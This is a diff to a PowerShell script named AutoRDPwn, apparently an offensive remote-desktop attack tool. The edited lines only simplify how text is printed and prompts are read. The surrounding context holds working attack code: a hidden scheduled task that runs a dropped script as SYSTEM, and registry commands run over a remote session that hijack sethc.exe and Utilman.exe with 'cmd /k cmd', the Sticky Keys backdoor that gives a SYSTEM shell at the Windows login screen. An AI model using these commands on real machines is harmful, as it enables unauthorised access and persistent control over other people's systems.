@@ -354,9 +354,8 @@ if($Language -in 'Spanish') {
    $session = get-pssession ; if ($session){ 
 
         do { $Host.UI.RawUI.ForegroundColor = 'Gray'
-	if ($stickykeys){ $input = "control" } else { Write-Host "" ; 
-        $Random = New-Object System.Random ; $txt19 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $input = $Host.UI.ReadLine() }
+	if ($stickykeys){ $input = "control" } else { Write-Host "" 
+        $input = Read-Host -Prompt "txt19" }
         switch -wildcard ($input) {
 
         'ver' { $control = "false" ; Write-Host "" ;
@@ -431,8 +430,7 @@ echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
-Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' 
-$Random = New-Object System.Random ; $txt28 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))} ; sleep -milliseconds 3000 
+Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt28 ; sleep -milliseconds 3000 
 if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock { 
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
